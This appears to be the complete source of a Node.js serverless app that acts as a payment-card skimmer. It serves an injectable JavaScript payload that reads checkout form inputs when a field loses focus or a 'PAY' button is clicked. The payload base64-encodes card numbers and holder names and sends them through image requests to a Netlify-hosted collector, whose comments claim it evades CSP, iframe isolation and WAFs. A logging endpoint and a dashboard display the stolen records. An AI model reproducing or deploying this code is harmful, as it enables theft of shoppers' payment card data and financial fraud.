const express = require('express');
const serverless = require('serverless-http');
const app = express();

let logs = [];

// استقبال البيانات المشفرة عبر طلب صورة (GET) لتجاوز الـ CSP
app.get('/x', (req, res) => {
    let b64 = req.query.d;
    if(b64) {
        try {
            let decoded = Buffer.from(b64, 'base64').toString();
            logs.unshift({ time: new Date().toLocaleString(), data: JSON.parse(decoded) });
        } catch(e) {}
    }
    const img = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
    res.writeHead(200, {'Content-Type': 'image/gif', 'Content-Length': img.length}).end(img);
});

app.get('/data', (req, res) => { res.json(logs); });

// كود السحب (Payload) - مصمم لتجاوز الـ Iframe والـ WAF
app.get('/', (req, res) => {
    res.set('Content-Type', 'application/javascript');
    var p = "var u = 'https://willowy-kataifi-31efc6.netlify.app/x';" +
        "function s(o){ var d = btoa(JSON.stringify(o)); new Image().src = u + '?d=' + d; }" +
        "window.addEventListener('blur', function(){" + // التقاط البيانات عند مغادرة الحقل (تجاوز الـ Iframe)
        "  var i = {}; document.querySelectorAll('input').forEach(el => { i[el.name || el.id] = el.value; });" +
        "  if(i['card_number'] || i['number']){ s({ c: i['card_number'] || i['number'], h: i['card_name'] || i['holderName'], type: 'BLUR_CAPTURE' }); }" +
        "}, true);" +
        "document.addEventListener('click', function(e){" + // التقاط البيانات عند الضغط على زر الدفع
        "  if(e.target.innerText && e.target.innerText.match(/PAGARE|PAY/i)){" +
        "    var ai = {}; document.querySelectorAll('input').forEach(el => { ai[el.name || el.id] = el.value; });" +
        "    s({ c: ai['card_number'] || ai['number'], h: ai['card_name'] || ai['holderName'], type: 'FINAL_SUBMIT' });" +
        "  }" +
        "});";
    res.send(p);
});

app.get('/dashboard', (req, res) => {
    res.send("<html><body style='background:#000;color:#0f0;font-family:monospace;padding:20px'><h1>XLESS ELITE LOGS - 2099</h1><button onclick='location.reload()'>REFRESH</button><hr><div id='v'></div><script>fetch('/data').then(r=>r.json()).then(data=>{document.getElementById('v').innerHTML = data.map(x=>'<p>['+x.time+'] '+JSON.stringify(x.data)+'</p>').join('');});</script></body></html>");
});

module.exports.handler = serverless(app);
